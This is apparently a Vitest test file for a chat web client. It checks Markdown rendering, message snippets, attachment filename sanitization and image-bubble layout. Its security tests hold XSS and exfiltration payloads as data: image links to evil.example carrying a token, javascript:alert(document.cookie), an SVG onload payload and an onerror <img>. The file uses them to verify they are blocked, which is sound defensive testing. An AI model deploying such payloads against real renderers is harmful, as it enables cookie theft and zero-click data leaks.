/**
 * @module web/tests/multimodal-messages
 * @description 多模态消息体验与安全门禁单测：
 * 1. 安全红线：聊天 Markdown 严禁将 `![alt](url)` 或原始 HTML 渲染为自动发起请求的 `<img>`（防零点击数据外带与 IP 探测）；
 * 2. 摘要前缀：`getMessageSnippet` 对图文/音文/文件/表情混排消息保留媒体标签前缀；
 * 3. 附件编码与输入舱：非表情图片携带清洗后 `fileName`、剪贴板匿名图重命名、动态 Placeholder；
 * 4. 图片气泡形态与公开隔离：紧凑 `p-1` 纯图相框、超长竖图裁切角标（零 `backdrop-blur`）、乐观发送期真实图片容器、公开分享只读隔离条与内联引用微缩略图；
 * 5. 右键菜单 `AppContextMenu`：图片专属动作顺序、`ClipboardItem` 能力门控与纯图转任务预填。
 */
import {
  type AgentId,
  type MessageDto,
  type RoomId,
  type UserId,
  asMessageSeq,
} from "@openhuddle/protocol";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { afterEach, describe, expect, it, vi } from "vitest";
import { AppTooltipProvider, normalizeContextMenuEntries } from "../components/primitives/index.js";
import { MarkdownContent } from "../components/ui/markdown-content.js";
import { MessageAttachment } from "../components/ui/message-attachment.js";
import { MessageBubble, buildMessageContextMenuItems } from "../components/ui/message-bubble.js";
import { resolveComposerPlaceholder } from "../features/huddle-room/components/message-composer.js";
import { getMessageSnippet } from "../lib/format.js";
import {
  encodeMessageAttachment,
  formatDraftAttachmentDisplayName,
  sanitizeAttachmentFileName,
} from "../lib/message-media.js";
import type { OptimisticMessageItem } from "../lib/query-keys.js";

const ROOM_ID = "rom_mm_test_01" as RoomId;
const USER_ID = "usr_mm_owner_01" as UserId;
const AGENT_ID = "agt_mm_codex_01" as AgentId;

afterEach(() => {
  vi.unstubAllGlobals();
});

function makeAgentImageMessage(overrides?: Partial<OptimisticMessageItem>): OptimisticMessageItem {
  return {
    roomId: ROOM_ID,
    seq: asMessageSeq(12),
    type: "text",
    author: {
      kind: "agent",
      agentId: AGENT_ID,
      ownerUserId: USER_ID,
      displayName: "Codex",
      platform: "codex",
      isYou: false,
      isYourOwner: true,
      trustLevel: "owner_sibling_agent",
    },
    content: "",
    attachment: {
      mimeType: "image/png",
      byteLength: 48_200,
      width: 1600,
      height: 900,
      fileName: "architecture.png",
    },
    mentions: [],
    createdAtIso: "2026-11-26T08:00:00.000Z",
    ...overrides,
  };
}

describe("@openhuddle/web — Markdown security redline: zero external <img> auto-load", () => {
  it("never renders <img> for external Markdown image syntax and degrades http(s) to safe explicit links", () => {
    const content = [
      "请查看截图 ![泄漏探测](https://evil.example/leak?room=secret&token=123)",
      "无描述图 ![](https://evil.example/pixel.gif)",
      '带标题图 ![系统架构图](https://cdn.example.com/arch.png "v2")',
    ].join("\n\n");

    const html = renderToStaticMarkup(createElement(MarkdownContent, { content }));

    expect(html.toLowerCase()).not.toContain("<img");
    expect(html).toContain('href="https://evil.example/leak?room=secret&amp;token=123"');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain("[外部图片：泄漏探测]");
    expect(html).toContain("[查看外部图片链接]");
    expect(html).toContain("[外部图片：系统架构图]");
  });

  it("blocks javascript:, data:, relative paths, and raw HTML <img> from generating any <img> or executable anchor", () => {
    const malicious = [
      "![xss](javascript:alert(document.cookie))",
      "![svg](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+)",
      "![csrf](/api/v1/auth/logout)",
      '<img src="https://evil.example/beacon.png" onerror="alert(1)" />',
    ].join("\n");

    const html = renderToStaticMarkup(createElement(MarkdownContent, { content: malicious }));

    expect(html.toLowerCase()).not.toContain("<img");
    expect(html.toLowerCase()).not.toContain("<a ");
    expect(html).not.toContain('href="javascript:');
    expect(html).not.toContain('href="data:');
  });
});

describe("@openhuddle/web — getMessageSnippet multimodal prefix preservation", () => {
  const baseMsg: MessageDto = makeAgentImageMessage({ content: "" });

  it("retains media category prefixes for both pure media and mixed media + text messages", () => {
    expect(getMessageSnippet(baseMsg, 80)).toBe("[图片]");
    expect(getMessageSnippet({ ...baseMsg, content: "  请帮我检查   网关层超时配置  " }, 80)).toBe(
      "[图片] 请帮我检查 网关层超时配置",
    );

    const stickerMsg: MessageDto = {
      ...baseMsg,
      content: "辛苦啦",
      attachment: { mimeType: "image/webp", byteLength: 2048, stickerName: "点赞" },
    };
    expect(getMessageSnippet({ ...stickerMsg, content: "" }, 80)).toBe("[表情] 点赞");
    expect(getMessageSnippet(stickerMsg, 80)).toBe("[表情] 点赞 辛苦啦");

    const fileMsg: MessageDto = {
      ...baseMsg,
      content: "请审阅接口契约",
      attachment: {
        mimeType: "application/octet-stream",
        byteLength: 12_800,
        fileName: "openapi.yaml",
      },
    };
    expect(getMessageSnippet({ ...fileMsg, content: "" }, 80)).toBe("[文件] openapi.yaml");
    expect(getMessageSnippet(fileMsg, 80)).toBe("[文件] openapi.yaml · 请审阅接口契约");

    const voiceMsg: MessageDto = {
      ...baseMsg,
      content: "补充两点发布注意事项",
      attachment: { mimeType: "audio/webm", byteLength: 9_600 },
    };
    expect(getMessageSnippet({ ...voiceMsg, content: "" }, 80)).toBe("[语音]");
    expect(getMessageSnippet(voiceMsg, 80)).toBe("[语音] 补充两点发布注意事项");

    expect(getMessageSnippet({ ...fileMsg, recalledAtIso: "2026-11-26T08:01:00.000Z" }, 80)).toBe(
      "该消息已撤回",
    );
  });
});

describe("@openhuddle/web — attachment filename sanitization, upload encoding & composer placeholders", () => {
  it("sanitizes filenames safely and formats anonymous clipboard image names", () => {
    expect(sanitizeAttachmentFileName("reply.png")).toBe("reply.png");
    expect(sanitizeAttachmentFileName("C:\\fakepath\\diagram\u0000.png")).toBe("diagram.png");
    expect(sanitizeAttachmentFileName("..")).toBeUndefined();
    expect(sanitizeAttachmentFileName("   ")).toBeUndefined();

    expect(formatDraftAttachmentDisplayName({ name: "image.png", mimeType: "image/png" })).toBe(
      "剪贴板图片.png",
    );
    expect(formatDraftAttachmentDisplayName({ name: "flow-v2.png", mimeType: "image/png" })).toBe(
      "flow-v2.png",
    );
    expect(
      formatDraftAttachmentDisplayName({
        name: "image.png",
        mimeType: "image/png",
        stickerName: "开心",
      }),
    ).toBe("image.png");
  });

  it("includes fileName when encoding non-sticker images and omits fileName for stickers", async () => {
    class StubFileReader {
      result: string | null = null;
      onload: (() => void) | null = null;
      onerror: (() => void) | null = null;
      onabort: (() => void) | null = null;
      readAsDataURL(_blob: Blob): void {
        this.result = "data:image/png;base64,iVBORw0KGgo=";
        this.onload?.();
      }
    }
    vi.stubGlobal("FileReader", StubFileReader);

    const blob = new Blob([new Uint8Array([1, 2, 3])], { type: "image/png" });
    const uploadedImage = await encodeMessageAttachment({
      blob,
      mimeType: "image/png",
      name: "reply.png",
    });
    expect(uploadedImage).toEqual({
      mimeType: "image/png",
      fileName: "reply.png",
      data: "iVBORw0KGgo=",
    });

    const uploadedSticker = await encodeMessageAttachment({
      blob,
      mimeType: "image/png",
      name: "thumbs-up",
      stickerName: "点赞",
    });
    expect(uploadedSticker).toEqual({
      mimeType: "image/png",
      stickerName: "点赞",
      data: "iVBORw0KGgo=",
    });
  });

  it("computes context-aware composer placeholders for normal, image-draft, dispatch, and ask modes", () => {
    expect(
      resolveComposerPlaceholder({
        roomName: "Codex",
        roomKind: "direct_agent",
        dispatchMode: false,
        askMode: false,
        hasDraftImage: false,
      }),
    ).toBe("发消息或图片给 Codex…");

    expect(
      resolveComposerPlaceholder({
        roomName: "架构评审群",
        roomKind: "group",
        dispatchMode: false,
        askMode: false,
        hasDraftImage: true,
      }),
    ).toBe("输入 @ 让 Agent 看图分析，或直接发送…");

    expect(
      resolveComposerPlaceholder({
        roomName: "架构评审群",
        roomKind: "group",
        dispatchMode: true,
        askMode: false,
        hasDraftImage: true,
      }),
    ).toBe("结合这张图片写下要交办的任务说明…");

    expect(
      resolveComposerPlaceholder({
        roomName: "架构评审群",
        roomKind: "group",
        dispatchMode: false,
        askMode: true,
        hasDraftImage: true,
      }),
    ).toBe("结合这张图片写下要提问的问题…");
  });
});

describe("@openhuddle/web — MessageBubble & MessageAttachment layout, optimistic & readOnly states", () => {
  const nowMs = Date.parse("2026-11-26T08:00:30.000Z");

  it("renders standalone image with compact p-1 frame, aspect-ratio 0-CLS sizing, and zero fixed gray box", () => {
    const html = renderToStaticMarkup(
      createElement(
        AppTooltipProvider,
        null,
        createElement(MessageBubble, {
          message: makeAgentImageMessage(),
          nowMs,
        }),
      ),
    );

    expect(html).toContain("p-1");
    expect(html).toContain("rounded-[14px]");
    expect(html).toContain("aspect-ratio:1600 / 900");
    expect(html).not.toContain("h-40 w-60");
    expect(html).not.toContain("backdrop-blur");
  });

  it("renders tall flowcharts (H / W > 2.2) with top crop and non-blurred 长图 · 查看全图 capsule", () => {
    const tallMsg = makeAgentImageMessage({
      attachment: {
        mimeType: "image/png",
        byteLength: 92_000,
        width: 800,
        height: 2200,
        fileName: "long-sequence.png",
      },
    });
    const html = renderToStaticMarkup(
      createElement(
        AppTooltipProvider,
        null,
        createElement(MessageBubble, {
          message: tallMsg,
          nowMs,
        }),
      ),
    );

    expect(html).toContain("object-cover object-top");
    expect(html).toContain("长图 · 查看全图");
    expect(html).toContain("bg-[#181B22]/76");
    expect(html).not.toContain("backdrop-blur");
  });

  it("renders optimistic pending image bubble with proportional frame and progress capsule instead of plain text 图片", () => {
    const optimisticImg = makeAgentImageMessage({
      author: {
        kind: "human",
        userId: USER_ID,
        ownerUserId: USER_ID,
        displayName: "庞彦",
        isYou: true,
        isYourOwner: true,
        trustLevel: "owner_command",
      },
      _optimisticPending: true,
      _optimisticBlob: new Blob([new Uint8Array([1, 2, 3])], { type: "image/png" }),
    });

    const html = renderToStaticMarkup(
      createElement(
        AppTooltipProvider,
        null,
        createElement(MessageBubble, {
          message: optimisticImg,
          nowMs,
        }),
      ),
    );

    expect(html).toContain('aria-label="图片发送中"');
    expect(html).toContain("bg-[#181B22]/68");
    expect(html).not.toContain("opacity-80");
    expect(html).not.toContain(">图片</span>");
  });

  it("isolates attachments on public readOnly share pages and embeds 28x28 reply micro-thumbnails only in member view", () => {
    const quotedImg = makeAgentImageMessage({ seq: asMessageSeq(9), content: "线上监控火焰图" });
    const pureWithUndefinedAttachment = makeAgentImageMessage({
      seq: asMessageSeq(15),
      content: "瓶颈在连接池竞争",
      replyToSeq: asMessageSeq(9),
    });
    const { attachment: _dropAttachment, ...replyMsg } = pureWithUndefinedAttachment;

    const memberReplyHtml = renderToStaticMarkup(
      createElement(
        AppTooltipProvider,
        null,
        createElement(MessageBubble, {
          message: replyMsg,
          repliedMessage: quotedImg,
          nowMs,
          readOnly: false,
        }),
      ),
    );
    expect(memberReplyHtml).toContain("h-7 w-7 shrink-0 rounded-[6px] object-cover");
    expect(memberReplyHtml).toContain("[图片] 线上监控火焰图");

    const publicShareImgHtml = renderToStaticMarkup(
      createElement(
        AppTooltipProvider,
        null,
        createElement(MessageBubble, {
          message: makeAgentImageMessage({ seq: asMessageSeq(9), content: "" }),
          nowMs,
          readOnly: true,
        }),
      ),
    );
    expect(publicShareImgHtml).toContain("图片附件（仅群成员可见）");
    expect(publicShareImgHtml).toContain("px-3 py-2");
    expect(publicShareImgHtml).not.toContain("/attachment");

    const strippedEmptyMsg = makeAgentImageMessage({ seq: asMessageSeq(10), content: "" });
    const { attachment: _omitAtt, ...emptyReadOnlyMsg } = strippedEmptyMsg;
    const emptyReadOnlyHtml = renderToStaticMarkup(
      createElement(
        AppTooltipProvider,
        null,
        createElement(MessageBubble, {
          message: emptyReadOnlyMsg,
          nowMs,
          readOnly: true,
        }),
      ),
    );
    expect(emptyReadOnlyHtml).toContain("消息内容仅群成员可见");

    const publicShareReplyHtml = renderToStaticMarkup(
      createElement(
        AppTooltipProvider,
        null,
        createElement(MessageBubble, {
          message: replyMsg,
          repliedMessage: quotedImg,
          nowMs,
          readOnly: true,
        }),
      ),
    );
    expect(publicShareReplyHtml).not.toContain("h-7 w-7 shrink-0 rounded-[6px]");
  });

  it("orders image message AppContextMenu items accurately and prefills task seed for standalone images", () => {
    const onConvertToWorkTask = vi.fn();
    const mixedImageMsg = makeAgentImageMessage({
      seq: asMessageSeq(12),
      content: "这是压测对比图",
    });

    const entriesWithClip = normalizeContextMenuEntries(
      buildMessageContextMenuItems({
        message: mixedImageMsg,
        isPending: false,
        isSelf: false,
        canRecall: false,
        canSaveSticker: false,
        canCopyImage: true,
        isAgentInspectable: true,
        hasLinkedProposal: false,
        capturedSelection: "",
        onReply: vi.fn(),
        onOpenLightbox: vi.fn(),
        onCopyImage: vi.fn(),
        onDownloadImage: vi.fn(),
        onCopyMessageContent: vi.fn(),
        onConvertToWorkTask,
        onQuickMention: vi.fn(),
        onInspectAgent: vi.fn(),
      }),
    );

    const labels = entriesWithClip
      .filter((item) => item.kind !== "separator" && item.kind !== "label")
      .map((item) => item.label);
    expect(labels.slice(0, 6)).toEqual([
      "回复此消息",
      "查看大图",
      "复制图片",
      "下载图片",
      "复制消息文字",
      "转为任务…",
    ]);

    const pureImageEntries = normalizeContextMenuEntries(
      buildMessageContextMenuItems({
        message: makeAgentImageMessage({ seq: asMessageSeq(12), content: "" }),
        isPending: false,
        isSelf: false,
        canRecall: false,
        canSaveSticker: false,
        canCopyImage: false,
        isAgentInspectable: false,
        hasLinkedProposal: false,
        capturedSelection: "",
        onReply: vi.fn(),
        onOpenLightbox: vi.fn(),
        onCopyImage: vi.fn(),
        onDownloadImage: vi.fn(),
        onConvertToWorkTask,
      }),
    );
    const pureLabels = pureImageEntries
      .filter((item) => item.kind !== "separator" && item.kind !== "label")
      .map((item) => item.label);
    expect(pureLabels).toEqual(["回复此消息", "查看大图", "下载图片", "转为任务…"]);

    const toTaskItem = pureImageEntries.find((item) => item.id === "ctx-msg-to-task");
    if (
      toTaskItem &&
      toTaskItem.kind !== "separator" &&
      toTaskItem.kind !== "label" &&
      toTaskItem.kind !== "submenu"
    ) {
      toTaskItem.onSelect();
    }
    expect(onConvertToWorkTask).toHaveBeenCalledWith("请结合消息 #12 的图片处理：");
  });

  it("renders readOnly recessed isolation bars for file and voice attachments without exposing /attachment URLs", () => {
    const fileHtml = renderToStaticMarkup(
      createElement(MessageAttachment, {
        message: {
          roomId: ROOM_ID,
          seq: asMessageSeq(20),
          attachment: {
            mimeType: "application/octet-stream",
            byteLength: 4096,
            fileName: "report.pdf",
          },
        },
        isPending: false,
        readOnly: true,
      }),
    );
    expect(fileHtml).toContain("文件附件（仅群成员可见）");
    expect(fileHtml).not.toContain("/attachment");

    const voiceHtml = renderToStaticMarkup(
      createElement(MessageAttachment, {
        message: {
          roomId: ROOM_ID,
          seq: asMessageSeq(21),
          attachment: {
            mimeType: "audio/webm",
            byteLength: 8192,
          },
        },
        isPending: false,
        readOnly: true,
      }),
    );
    expect(voiceHtml).toContain("语音消息（仅群成员可见）");
    expect(voiceHtml).not.toContain("/attachment");
  });
});
